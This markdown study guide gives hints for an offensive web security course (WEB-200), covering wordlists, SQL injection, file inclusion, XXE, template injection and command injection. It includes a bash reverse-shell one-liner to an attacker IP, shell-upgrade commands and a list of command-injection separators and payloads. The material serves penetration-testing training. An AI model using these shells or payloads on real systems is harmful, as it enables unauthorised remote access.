# Syllabus Related Hints
In this section I will pick a few topics out of the syllabus and give some technical hints. If you want me to give hints for other topics, create an issue. It is important to understand that my hints only make sense if you carefully read and complete the course material. **All links and hints I provide to external resources should be considered as additional literature which are no replacement for the material provided by offsec. The offsec course material is gold imho.**

## Tools
### Wordlists
Beside the standard Kali linux wordlists located under `/usr/share/wordlists` I think the seclists package is a premium set of wordlists which fits most needs. Especially it has lists connected to certain vulnerabilities like SQL-Injection, Local File Inclusion, 
Server-side Template Injection and so on which comes in handy for several topics of the web-200 course.
```bash
sudo apt-get install -y seclists
cd /usr/share/seclists/
```

### Shells
During the course and the exam you will have to identify/exploit different kind of vulnerabilities which might lead to some kind of remote code execution. Therefore it is always useful to get a reverse shell connecting to your kali machine instead of exploiting the 
vulnerability again and agin. For me in most cases the standard `bash` back connect shell worked great (under linux of course)
```bash
bash -c 'bash -i >& /dev/tcp/<KALI-IP>/9090 0>&1'
```

Sometimes it is useful to upgrade this shell to a fully interactive one

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
CTRL+Z
```bash
stty raw -echo; fg
```
Now you should have a fully interactive shell. This sometimes is needed when you do some kind of privilege escalation stuff. (not part of web-200)

## SQL-Injection
- `seclists` has awesome wordlists to manually detect SQL injection vulnerabilities using tools like `wfuzz` or `burpsuite`: `/usr/share/seclists/SQLi`
- one word regarding `SQLMap`: this tool is allowed during the exam
- however, in my experience `SQLMap` often fails even if there is an SQL-Injection
- I usually use `SQLMap` only after I identified the vulnerability manually and only use it to exfiltrate data when manual exfiltration is to expensive
- therefore I parameterize `SQLMap` in a way it does not send useless requests to the target, because the tool is noisy as hell and (depending on the configuration) influences the integrity of the database
- when you identified an injection it is cruical that you have a good cheat sheet available, so you can exfiltrate data in a copy paste style
  - https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
  - https://portswigger.net/web-security/sql-injection/cheat-sheet

## Directory Traversal and Local File Inclusion
- general test cases: https://zsahi.wordpress.com/2018/09/10/file-inclusion/
- useful wordlists to combine with `wfuzz` or `burpsuite`: `/usr/share/seclists/Fuzzing/LFI/`

## XML External Entity Attack
- often overlooked
- know how to idenfitiy this kind of vulnerability
- every point where the application might parse XML is a potential dangerous sink where you can test for it
- get used to how to read files by exploiting an XXE attack "visibly" and blind
  - https://portswigger.net/web-security/xxe
  - https://portswigger.net/web-security/xxe/blind

## Server-side Template Injection
### identify
- often overlooked
- identifying is not always easy 
- you need to identify what kind of technology/framework is used on the target machine
- then it is a good idea to perform some basic tests to identify if templates are used at all and the website is vulnerable
- `seclists` provides a good wordlist to detect SSTIs: `/usr/share/seclists/Fuzzing/template-engines-expressions.txt`
- the following picture gives an overview what template engine might be in use if a certain test succeeded: https://portswigger.net/web-security/images/template-decision-tree.png

### exploit
- the exploitation impact ranges from XSS to RCE depending on the template engine used
- RCEs for apache freemarker, twig and pug/jade: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

## Command Injection
Try to think what the target application might do in the backend when using features of the website. Does the web application maybe call an external program? When you identified a potential injection point you usually have to escape from the original command and inject your own.

### Command Seperators
- `&`
- `&&`
- `|`
- `||`
- `;` (no Windows CMD)
- `0x0a` (no Windows CMD)
- `\n` (no Windows CMD)
- ``` `whoami` ``` (no Windows CMD)
- `$(whoami)` (no Windows CMD)

### Good Reads
- https://www.hackedu.com/blog/owasp-top-10-mini-series-command-injection
- https://book.hacktricks.xyz/pentesting-web/command-injection

